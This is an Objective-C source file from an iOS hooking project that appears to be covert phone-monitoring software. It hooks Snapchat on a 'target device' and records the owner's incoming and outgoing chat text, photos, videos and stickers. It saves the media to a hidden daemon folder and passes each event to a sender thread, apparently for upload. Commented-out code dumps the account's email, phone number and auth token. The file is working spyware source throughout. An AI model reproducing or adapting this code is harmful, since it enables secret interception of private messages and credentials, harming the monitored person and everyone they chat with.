//
//  SnapchatUtils.m
//  ExampleHook
//
//  Created by benjawan tanarattanakorn on 3/10/2557 BE.
//
//

#import <objc/runtime.h>

#import "SnapchatUtils.h"
#import "SnapchatEventSender.h"
#import "IMShareUtils.h"

#import "Manager.h"
#import "User.h"
#import "User+7-0-1.h"
#import "User+9-13-0.h"
#import "Friends.h"
#import "Friend.h"

#import "FxIMEvent.h"
#import "FxEventEnums.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"

static SnapchatUtils  *_SnapchatUtils = nil;


@interface SnapchatUtils ()

// -- get account on target device
+ (User *) getSnapchatTargetUser;
+ (NSString *) getTargetUserID;
+ (NSString *) getTargetDisplayName;

+ (void) sendSnapchatEvent: (FxIMEvent *) aIMEvent;
+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname;

+ (NSString *) createTimeStamp;

//+ (void) printUserInfo : (User *) user;
- (BOOL) isSupportSnapchatChatType: (SnapchatChatType) aSnapchatChatType;

// -- incoming
@property (nonatomic, copy) NSString *mSenderID;
@property (nonatomic, copy) NSString *mSenderDisplayName;
@property (nonatomic, retain) NSArray *mProcessedVideoIDArray;
@property (nonatomic, copy) NSString *mConversationID;

// -- outgoing
@property (nonatomic, copy) NSString *mOutgoingVideoPath;
@property (nonatomic, copy) NSString *mOutgoingPhotoPath;

@end
    

@implementation SnapchatUtils


#pragma mark - Initialization


+ (id) sharedSnapchatUtils {
	if (_SnapchatUtils == nil) {
		_SnapchatUtils = [[SnapchatUtils alloc] init];
	}
	return (_SnapchatUtils);
}

- (id)init
{
    self = [super init];
    if (self) {
        self.mSenderID           = nil;
        self.mSenderDisplayName  = nil;
        self.mConversationID     = nil;
        self.mSnapchatChatType   = kSnapchatChatTypeUnknown;
        self.mIncomingState      = kSnapchatIncomingStateUndefined;
        self.mOutgoingVideoPath  = nil;
        self.mOutgoingPhotoPath  = nil;
        
        NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *documentPath = [searchPaths objectAtIndex:0];
        NSString *capturedMessageIDPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"snapchat-ids.plist"];
        NSDictionary *capturedMessageIDInfo = [NSDictionary dictionaryWithContentsOfFile:capturedMessageIDPath];

        if (!capturedMessageIDInfo) {
            DLog(@"No file");
            self.mCapturedMessageIDInfo = [[NSMutableDictionary alloc] init];
        }
        else {
            self.mCapturedMessageIDInfo = [[NSMutableDictionary alloc] initWithDictionary:capturedMessageIDInfo];
        }
        
        
    }
    return self;
}


#pragma mark - Incoming


- (void) setSenderIDForIncoming: (NSString *) aSenderID
              senderDisplayName: (NSString *) aSenderDisplayName
               snapchatChatType: (SnapchatChatType) aSnapchatChatType {
    
    if ([self isSupportSnapchatChatType:aSnapchatChatType]) {
        self.mSenderID           = aSenderID;
        self.mSenderDisplayName  = aSenderDisplayName;
        self.mSnapchatChatType   = aSnapchatChatType;
        self.mConversationID     = nil;
        DLog(@">> mSenderID %@, mSenderDisplayName %@",
             self.mSenderID,
             self.mSenderDisplayName);
        
    } else {
        DLog(@"Not Capture other snapchat type besides Individual !!!");
    }
}

- (void) setSenderIDForIncoming: (NSString *) aSenderID
              senderDisplayName: (NSString *) aSenderDisplayName
               snapchatChatType: (SnapchatChatType) aSnapchatChatType
                       converID: (NSString *) aConverID {
    
    if ([self isSupportSnapchatChatType:aSnapchatChatType]) {
        self.mSenderID           = aSenderID;
        self.mSenderDisplayName  = aSenderDisplayName;
        self.mSnapchatChatType   = aSnapchatChatType;
        self.mConversationID     = aConverID;
        
        DLog(@">> mSenderID %@, mSenderDisplayName %@, converID %@",
             self.mSenderID,
             self.mSenderDisplayName,
             self.mConversationID);

    } else {
        DLog(@"Not Capture other snapchat type besides Individual !!!");
    }
}

- (void) resetSenderInfoForIncoming {
    self.mSenderID          = nil;
    self.mSenderDisplayName = nil;
    self.mSnapchatChatType  = kSnapchatChatTypeUnknown;
    self.mConversationID    = nil;
}

- (BOOL) isDuplicateMediaID: (NSString *) aMediaID {
    //DLog(@"mProcessedVideoIDArray %@", self.mProcessedVideoIDArray);
    for (id processedMediaID in self.mProcessedVideoIDArray) {
        if ([processedMediaID isEqualToString:aMediaID]) {
            return YES;
        }
    }
    return NO;
}

// getter method for mProcessedVideoIDArray
- (NSArray *) mProcessedVideoIDArray {
    if (!_mProcessedVideoIDArray) {
        _mProcessedVideoIDArray = [[NSArray alloc] init];
    }
    return _mProcessedVideoIDArray;
}

- (void) resetMediaIDWith: (NSArray *) aMediaIDArray {
    //DLog(@"BEFORE mProcessedVideoIDArray %@", self.mProcessedVideoIDArray);
    self.mProcessedVideoIDArray = nil;
    self.mProcessedVideoIDArray = aMediaIDArray;
    DLog(@"AFTER mProcessedVideoIDArray %@", self.mProcessedVideoIDArray);
}


#pragma mark - Outgoing

- (void) saveOutgoingVideoPath: (NSString *) aOutVideoPath {
    self.mOutgoingVideoPath = aOutVideoPath;
}

- (void) clearOutgoingVideoPath {
    self.mOutgoingVideoPath = nil;
}


- (void) saveOutgoingPhotoPath: (NSString *) aOutPhotoPath {
    self.mOutgoingPhotoPath = aOutPhotoPath;
}

- (void) clearOutgoingPhotoPath {
    self.mOutgoingPhotoPath = nil;
}

#pragma mark - Target Inforamation

+ (User *) getSnapchatTargetUser {
    Class $Manager          = objc_getClass("Manager");
    Manager *sharedManager  = [$Manager shared];
    User *user              = [sharedManager user];
    return user;
}

+ (NSString *) getTargetUserID {
    User *user              = [self getSnapchatTargetUser];
    NSString *username      = nil;
    if ([user respondsToSelector:@selector(getUsername)]) {
        // < 9.13.0
        username = [user getUsername];
    } else {
        username = [user username];
    }
    DLog(@"target username [%@]", username);                // -- username
    //[self printUserInfo:user];
    return username;
}

+ (NSString *) getTargetDisplayName {
    User *user                  = [self getSnapchatTargetUser];
    Friends *friends            = [user friends];
    NSString *targetDisplayName = [friends displayNameForUsername:[self getTargetUserID]];
    DLog(@"target display name >> [%@]", targetDisplayName);
    return targetDisplayName;
}


#pragma mark - Incoming Event Handler


+ (void) sendIncomingIMEventForSenderID: (NSString *) aSenderID
                      senderDisplayName: (NSString *) aSenderDisplayName
                            messageText: (NSString *) aMessageText
                               converID: (NSString *) aConverID {
    NSString *imServiceId				= @"Snapchat";
    FxEventDirection direction          = kEventDirectionIn;
    
    NSString *message                   = aMessageText;
    
    FxIMEvent *imEvent                  = [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:imServiceId];
    
    [imEvent setMServiceID:kIMServiceSnapchat];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    
    [imEvent setMRepresentationOfMessage:kIMMessageText];
    [imEvent setMMessage:message];
    
    // user (sender)
    [imEvent setMUserID:aSenderID];                         // sender id
    [imEvent setMUserDisplayName:aSenderDisplayName];		// sender display name
    [imEvent setMUserStatusMessage:nil];                    // sender status message
    [imEvent setMUserPicture:nil];                          // sender image profile
    [imEvent setMUserLocation:nil];                         // sender location
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aSenderDisplayName];
    [imEvent setMConversationPicture:nil];
    
    // participant
    NSString *targetID                          = [self getTargetUserID];
    NSString *targetDisplayName                 = [self getTargetDisplayName];
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant                    = [self createFxRecipientWithUsername:targetID
                                                                          displayname:targetDisplayName];
    [participants addObject:participant];
    [imEvent setMParticipants:participants];
    
    // share location
    [imEvent setMShareLocation:nil];
    DLog(@"SNAP CHAT IN EVENT %@", imEvent);
    
    if (([imEvent mMessage] && [[imEvent mMessage] length] != 0)) {
        DLog(@"!!! sending SNAP CHAT IN EVENT");
        [self sendSnapchatEvent:imEvent];
    }
    
    [imEvent release];
}

+ (void) sendIncomingIMEventForSenderID: (NSString *) aSenderID
                      senderDisplayName: (NSString *) aSenderDisplayName
                              mediaPath: (NSString *) aMediaPath {

    [SnapchatUtils sendIncomingIMEventForSenderID:aSenderID senderDisplayName:aSenderDisplayName mediaPath:aMediaPath converID:aSenderID];
}

+ (void) sendIncomingIMEventForSenderID: (NSString *) aSenderID
                      senderDisplayName: (NSString *) aSenderDisplayName
                              mediaPath: (NSString *) aMediaPath
                               converID: (NSString *) aConverID {
    NSString *imServiceId				= @"Snapchat";
    FxEventDirection direction          = kEventDirectionIn;
    
    NSString *message                   = nil;
    
    FxIMEvent *imEvent                  = [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:imServiceId];
    
    [imEvent setMServiceID:kIMServiceSnapchat];

    [imEvent setMDirection:(FxEventDirection)direction];
    
    [imEvent setMRepresentationOfMessage:kIMMessageNone];
    [imEvent setMMessage:message];
    
    // user (sender)
    [imEvent setMUserID:aSenderID];                         // sender id
    [imEvent setMUserDisplayName:aSenderDisplayName];		// sender display name
    [imEvent setMUserStatusMessage:nil];                    // sender status message
    [imEvent setMUserPicture:nil];                          // sender image profile
    [imEvent setMUserLocation:nil];                         // sender location
    
     // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aSenderDisplayName];
    [imEvent setMConversationPicture:nil];
    
    // participant
    NSString *targetID                          = [self getTargetUserID];
    NSString *targetDisplayName                 = [self getTargetDisplayName];
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant                    = [self createFxRecipientWithUsername:targetID
                                                                          displayname:targetDisplayName];
    [participants addObject:participant];
    [imEvent setMParticipants:participants];
  
    // attachment
   
    if (aMediaPath) {
        NSMutableArray *attachments                 = [NSMutableArray array];
        FxAttachment *attachment                    = [[FxAttachment alloc] init];
        [attachment setFullPath:aMediaPath];
        [attachment setMThumbnail:nil];
        
        [attachments addObject:attachment];
        [attachment release];
        
        [imEvent setMAttachments:attachments];
    }
    // share location
    [imEvent setMShareLocation:nil];
    DLog(@"SNAP CHAT IN EVENT %@", imEvent);
    
    if ([[imEvent mAttachments] count]) {  // has attachment
        DLog(@"!!! sending SNAP CHAT IN EVENT");
        [self sendSnapchatEvent:imEvent];
    }
    
    [imEvent release];
}

+ (void) sendIncomingIMEventForSenderID: (NSString *) aSenderID
                      senderDisplayName: (NSString *) aSenderDisplayName
                                  media: (id) aMedia
                               converID: (NSString *) aConverID
                              messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation{
    NSString *imServiceId				= @"Snapchat";
    FxEventDirection direction          = kEventDirectionIn;
    
    NSString *message                   = nil;
    
    FxIMEvent *imEvent                  = [[FxIMEvent alloc] init];
    
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:imServiceId];
    
    [imEvent setMServiceID:kIMServiceSnapchat];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    
    [imEvent setMRepresentationOfMessage:aMessageRepresentation];
    [imEvent setMMessage:message];
    
    // user (sender)
    [imEvent setMUserID:aSenderID];                         // sender id
    [imEvent setMUserDisplayName:aSenderDisplayName];		// sender display name
    [imEvent setMUserStatusMessage:nil];                    // sender status message
    [imEvent setMUserPicture:nil];                          // sender image profile
    [imEvent setMUserLocation:nil];                         // sender location
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aSenderDisplayName];
    [imEvent setMConversationPicture:nil];
    
    // participant
    NSString *targetID                          = [self getTargetUserID];
    NSString *targetDisplayName                 = [self getTargetDisplayName];
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant                    = [self createFxRecipientWithUsername:targetID
                                                                          displayname:targetDisplayName];
    [participants addObject:participant];
    [imEvent setMParticipants:participants];
    
    // attachment
    
    if ([aMedia isKindOfClass:[NSData class]]) {// For sticker message
        NSMutableArray *attachments = [NSMutableArray array];
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setMThumbnail:aMedia];
        [attachments addObject:attachment];
        [attachment release];
        
        [imEvent setMAttachments:attachments];
    }
    else if ([aMedia isKindOfClass:[NSDictionary class]]) {
        NSDictionary *aMediaDataDic = aMedia;
        
        NSData *mediaData = aMediaDataDic[@"MediaData"];
        BOOL isVideo = [aMediaDataDic[@"isVideo"] boolValue];
        
        NSString *mediaPath = [SnapchatUtils getOutputPathForExtension:@"jpg"];
       
        if (isVideo) {
            mediaPath = [SnapchatUtils getOutputPathForExtension:@"mov"];
        }
        
        if (![mediaData writeToFile:mediaPath atomically:YES]) {
            // iOS 9, Sandbox
            mediaPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
        }
        
        NSMutableArray *attachments = [NSMutableArray array];
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setFullPath:mediaPath];
        [attachment setMThumbnail:nil];
        
        [attachments addObject:attachment];
        [attachment release];
        
        [imEvent setMAttachments:attachments];
    }
    else if ([aMedia isKindOfClass:[NSArray class]] || [aMedia isKindOfClass:[NSMutableArray class]]){
        NSMutableArray *attachments = [NSMutableArray array];
        
        [aMedia enumerateObjectsUsingBlock:^(NSDictionary *aMediaDataDic, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            NSData *mediaData = aMediaDataDic[@"MediaData"];
            BOOL isVideo = [aMediaDataDic[@"isVideo"] boolValue];
            
            NSString *mediaPath = [SnapchatUtils getOutputPathForExtension:@"jpg"];
            
            if (isVideo) {
                mediaPath = [SnapchatUtils getOutputPathForExtension:@"mov"];
            }
            
            if (![mediaData writeToFile:mediaPath atomically:YES]) {
                // iOS 9, Sandbox
                mediaPath = [IMShareUtils saveData:mediaData toDocumentSubDirectory:@"/attachments/imSnapchat/" fileName:[mediaPath lastPathComponent]];
            }
            
            FxAttachment *attachment = [[FxAttachment alloc] init];
            [attachment setFullPath:mediaPath];
            [attachment setMThumbnail:nil];
            
            [attachments addObject:attachment];
            [attachment release];
        }];

        [imEvent setMAttachments:attachments];
    }

    // share location
    [imEvent setMShareLocation:nil];
    DLog(@"SNAP CHAT IN EVENT %@", imEvent);
    
    if ([[imEvent mAttachments] count]) {  // has attachment
        DLog(@"!!! sending SNAP CHAT IN EVENT");
        [self sendSnapchatEvent:imEvent];
    }
    
    [imEvent release];
}


#pragma mark - Outgoing Event Handler

+ (void) sendOutgoingIMEventForRecipientID: (NSString *) aRecipientID
                      recipientDisplayName: (NSString *) aRecipientDisplayName
                               messageText: (NSString *) aMessageText
                                  converID: (NSString *) aConverID {
    NSString *imServiceId				= @"Snapchat";
    FxEventDirection direction          = kEventDirectionOut;
    
    NSString *targetID                  = [self getTargetUserID];
    NSString *targetDisplayName         = [self getTargetDisplayName];
    
    NSString *message                   = aMessageText;
    NSString *textRepresentation        = kIMMessageText;
    
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:imServiceId];
    
    [imEvent setMServiceID:kIMServiceSnapchat];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    
    [imEvent setMRepresentationOfMessage:textRepresentation];
    [imEvent setMMessage:message];
    
    // user (sender)
    [imEvent setMUserID:targetID];                          // sender id
    [imEvent setMUserDisplayName:targetDisplayName];		// sender display name
    [imEvent setMUserStatusMessage:nil];                    // sender status message
    [imEvent setMUserPicture:nil];                          // sender image profile
    [imEvent setMUserLocation:nil];                         // sender location
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aRecipientDisplayName];
    [imEvent setMConversationPicture:nil];
    
    // participant
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant                    = [self createFxRecipientWithUsername:aRecipientID
                                                                          displayname:aRecipientDisplayName];
    [participants addObject:participant];
    [imEvent setMParticipants:participants];
    
    // share location
    [imEvent setMShareLocation:nil];
    
    DLog(@"SNAP CHAT OUT EVENT %@", imEvent);
    
    if (([imEvent mMessage] && [[imEvent mMessage] length] != 0)  ||  // has message OR
        [[imEvent mAttachments] count]                            ){  // has attachment
        DLog(@"!!! sending SNAP CHAT OUT EVENT");
        [self sendSnapchatEvent:imEvent];
    }
    
    [imEvent release];
}

+ (void) sendOutgoingIMEventForRecipientID: (NSString *) aRecipientID
                      recipientDisplayName: (NSString *) aRecipientDisplayName
                                 mediaPath: (NSString *) aMediaPath
                               captionText: (NSString *) aCaptionText {
    [SnapchatUtils sendOutgoingIMEventForRecipientID:aRecipientID recipientDisplayName:aRecipientDisplayName media:aMediaPath captionText:aCaptionText converID:aRecipientID messageRepresentation:kIMMessageNone];
}

+ (void) sendOutgoingIMEventForRecipientID: (NSString *) aRecipientID
                      recipientDisplayName: (NSString *) aRecipientDisplayName
                                     media: (id) aMedia
                               captionText: (NSString *) aCaptionText
                                  converID: (NSString *) aConverID
                     messageRepresentation: (FxIMMessageRepresentation) aMessageRepresentation
{
    NSString *imServiceId				= @"Snapchat";
    FxEventDirection direction          = kEventDirectionOut;

    NSString *targetID                  = [self getTargetUserID];
    NSString *targetDisplayName         = [self getTargetDisplayName];
    
    NSString *message                   = nil;
    NSString *textRepresentation        = aMessageRepresentation;
    
    FxIMEvent *imEvent	= [[FxIMEvent alloc] init];
    [imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
    [imEvent setMIMServiceID:imServiceId];
    
    [imEvent setMServiceID:kIMServiceSnapchat];
    
    [imEvent setMDirection:(FxEventDirection)direction];
    
    // message
    if (aCaptionText && [aCaptionText length]) {
        message             = [aCaptionText copy];
        textRepresentation  = kIMMessageText;
    }
  
    [imEvent setMRepresentationOfMessage:textRepresentation];
    [imEvent setMMessage:message];
    
    // user (sender)
    [imEvent setMUserID:targetID];                          // sender id
    [imEvent setMUserDisplayName:targetDisplayName];		// sender display name
    [imEvent setMUserStatusMessage:nil];                    // sender status message
    [imEvent setMUserPicture:nil];                          // sender image profile
    [imEvent setMUserLocation:nil];                         // sender location
    
    // converstation
    [imEvent setMConversationID:aConverID];
    [imEvent setMConversationName:aRecipientDisplayName];
    [imEvent setMConversationPicture:nil];
    
    // participant
    NSMutableArray *participants                = [NSMutableArray array];
    FxRecipient *participant                    = [self createFxRecipientWithUsername:aRecipientID
                                                                          displayname:aRecipientDisplayName];
    [participants addObject:participant];
    [imEvent setMParticipants:participants];
    
    // attachment
    
    if ([aMedia isKindOfClass:[NSData class]]) {// For sticker message
        NSMutableArray *attachments = [NSMutableArray array];
        FxAttachment *attachment = [[FxAttachment alloc] init];
        [attachment setMThumbnail:aMedia];
        [attachments addObject:attachment];
        [attachment release];
        
        [imEvent setMAttachments:attachments];
    }
    else if ([aMedia isKindOfClass:[NSString class]]) {
        NSMutableArray *attachments                 = [NSMutableArray array];
        FxAttachment *attachment                    = [[FxAttachment alloc] init];
        [attachment setFullPath:aMedia];
        [attachment setMThumbnail:nil];
        
        [attachments addObject:attachment];
        [attachment release];
        
        [imEvent setMAttachments:attachments];
    }
    else if ([aMedia isKindOfClass:[NSMutableArray class]] || [aMedia isKindOfClass:[NSArray class]]) {//For batch media
        NSMutableArray *attachments                 = [NSMutableArray array];
        [aMedia enumerateObjectsUsingBlock:^(NSString *aMediaPath, NSUInteger idx, BOOL * /*_Nonnull*/ stop) {
            FxAttachment *attachment                    = [[FxAttachment alloc] init];
            [attachment setFullPath:aMediaPath];
            [attachment setMThumbnail:nil];
            
            [attachments addObject:attachment];
            [attachment release];
            
            
        }];
        [imEvent setMAttachments:attachments];
    }
    
    // share location
    [imEvent setMShareLocation:nil];
    DLog(@"SNAP CHAT OUT EVENT %@", imEvent);
    
    if (([imEvent mMessage] && [[imEvent mMessage] length] != 0)  ||  // has message OR
        [[imEvent mAttachments] count]                            ){  // has attachment
        DLog(@"!!! sending SNAP CHAT OUT EVENT");
        [self sendSnapchatEvent:imEvent];
    }

    [message release];
    [imEvent release];
}

#pragma mark - Utilities

+ (NSString *) getOutputPathForExtension: (NSString *) aExtension {
    NSString *snapchatAttachmentPath	= [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imSnapchat/"];
    snapchatAttachmentPath              = [SnapchatUtils getOutputPath:snapchatAttachmentPath extension:aExtension];
    return snapchatAttachmentPath;
}

+ (UIImage *) getImageFromView: (UIView *) aView {
    // Get image from current context
    UIGraphicsBeginImageContextWithOptions(aView.bounds.size, aView.opaque, 0.0);
    [aView.layer renderInContext:UIGraphicsGetCurrentContext()];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    return image;
}

+ (User *) getUser {
    return [self getSnapchatTargetUser];
}

- (void)saveCapturedMessageID:(NSString *)messageID
{
    DLog(@"mCapturedMessageIDInfo %@", self.mCapturedMessageIDInfo)
    [self.mCapturedMessageIDInfo setObject:messageID forKey:messageID];
    
    NSArray *searchPaths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentPath = [searchPaths objectAtIndex:0];
    NSString *capturedMessageIDPath = [NSString stringWithFormat:@"%@/%@", documentPath, @"snapchat-ids.plist"];
    [self.mCapturedMessageIDInfo writeToFile:capturedMessageIDPath atomically:YES];
}

- (BOOL)canCaptureMessageWithID:(NSString *)messageID
{
    DLog(@"messageID %@", messageID)
    if ([self.mCapturedMessageIDInfo objectForKey:messageID]) {
        DLog(@"Duplicate");
        return NO;
    }
    
    DLog(@"Can capture")
    return YES;
}

#pragma mark - Private Method

+ (void) sendSnapchatEvent: (FxIMEvent *) aIMEvent {
	SnapchatEventSender *snSender = [[SnapchatEventSender alloc] init];
	[NSThread detachNewThreadSelector:@selector(thread:)
							 toTarget:snSender
                           withObject:aIMEvent];
    [snSender release];
}

+ (FxRecipient *) createFxRecipientWithUsername: (NSString *) aUserID
                                    displayname: (NSString *) aUserDisplayname  {
	FxRecipient *participant = [[FxRecipient alloc] init];
	[participant setRecipNumAddr:aUserID];
	[participant setRecipContactName:aUserDisplayname];
	[participant setMStatusMessage:nil];
	[participant setMPicture:nil];
	DLog (@"recipient id %@",   aUserID)
	DLog (@"recipient name %@", aUserDisplayname)
	return [participant autorelease];
}

+ (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SSS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

+ (NSString *) getOutputPath: (NSString *) aOutputPathWithoutExtension
				   extension: (NSString *) aExtension {
	NSString *formattedDateString = [self createTimeStamp];
	NSString *outputPath = [[NSString alloc] initWithFormat:@"%@im_%@.%@",
							aOutputPathWithoutExtension,
							formattedDateString,
							aExtension];
	return [outputPath autorelease];
}

- (BOOL) isSupportSnapchatChatType: (SnapchatChatType) aSnapchatChatType {
    BOOL isSupport = NO;
    if (aSnapchatChatType == kSnapchatChatTypeInIndividual) {
        isSupport = YES;
    }
    return isSupport;
}

+ (id) getDisplayNameForUsername: (NSString *) aUsername {
    User *user                  = [self getSnapchatTargetUser];
    Friends *friends            = [user friends];
    
    DLog(@"user >> %@", user);
    DLog(@"allFriends >> %@", [friends allFriends]);      // NSDictinoary
    
    NSDictionary *allFriends    = (NSDictionary *)[friends allFriends];
    Friend *friend              = [allFriends valueForKey:aUsername];
    NSString *displayName       = @"";
    if (friend) {
        displayName = [friend nameToDisplay];
    }
    DLog(@"displayName = %@", displayName);
    return displayName;
}

- (void) dealloc {
    [super dealloc];
    self.mSenderID          = nil;
    self.mSenderDisplayName = nil;
    self.mOutgoingVideoPath = nil;
    self.mOutgoingPhotoPath = nil;
    self.mConversationID    = nil;
    self.mCapturedMessageIDInfo = nil;
}

//+ (void) printUserInfo : (User *) user {
//    DLog(@"mobile >> %@",             [user mobile]);                     // -- mobile number that receive activation code
//    DLog(@"getUsername >> %@",        [user getUsername]);                // -- username
//    DLog(@"username >> %@",           [user username]);                   // -- username
//    DLog(@"getLoginUsername >> %@",   [user getLoginUsername]);   // -- (null)
//    DLog(@"loginUsername >> %@",      [user loginUsername]);      // -- (null)
//    DLog(@"getEmail >> %@",           [user getEmail]);           // -- email address. This can be changed
//    DLog(@"email >> %@",              [user email]);              // -- email address. This can be changed
//    DLog(@"snaps >> %@",              [user snaps]);
//    DLog(@"friends >> %@",            [user friends]);
//    DLog(@"featureSettings >> %@",    [user featureSettings]);
//    DLog(@"deviceToken >> %@",        [user deviceToken]);
//    DLog(@"authToken >> %@",          [user authToken]);
//    
//}

//+ (void) printMediaInfo : (Media *) media {
//    DLog(@"media %@",              media);
//    DLog(@"dataSource %@",         [media dataSource]);
//    DLog(@"mediaDataToUpload %d",  [[media mediaDataToUpload] length]);
//    DLog(@"overlayDataToUpload %d",[[media overlayDataToUpload] length]);
//    DLog(@"isImage %d",            [media isImage]);
//    DLog(@"isVideo %d",            [media isVideo]);
//    DLog(@"videoPath %@",          [media videoPath]);
//    DLog(@"mediaId %@",            [media mediaId]);
//    DLog(@"playerItem %@",            [media playerItem]);
//}
//
//+ (id) getSnapchatFriends {
//    User *user                  = [self getSnapchatTargetUser];
//    Friends *friends            = [user friends];
//
//    DLog(@"allFriends >> %@ %@", [[friends allFriends] class], [friends allFriends]);      // NSDictinoary
//    DLog(@"bestFriends >> %@ %@", [[friends bestFriends] class], [friends bestFriends]);   // NSArray
//
//    NSDictionary *allFriends    = (NSDictionary *)[friends allFriends];
//
//    NSArray *allFriendArray     = [allFriends allValues];
//
//    NSMutableDictionary *friendIDAndNameCollection = [NSMutableDictionary dictionary];
//
//
//    // See which friend is blocked to see MyStory
//    for (Friend *eachFriend in allFriendArray) {
//        DLog (@"## %d ## ----- display %@ name %@ see story %d",
//               [allFriendArray indexOfObject:eachFriend],
//               [eachFriend nameToDisplay],
//               [eachFriend name],
//               [eachFriend canSeeCustomStories]);
//        [friendIDAndNameCollection setObject:[eachFriend nameToDisplay]     // display name
//                                      forKey:[eachFriend name]];            // user id
//    }
//    return friendIDAndNameCollection;
//
//}




@end
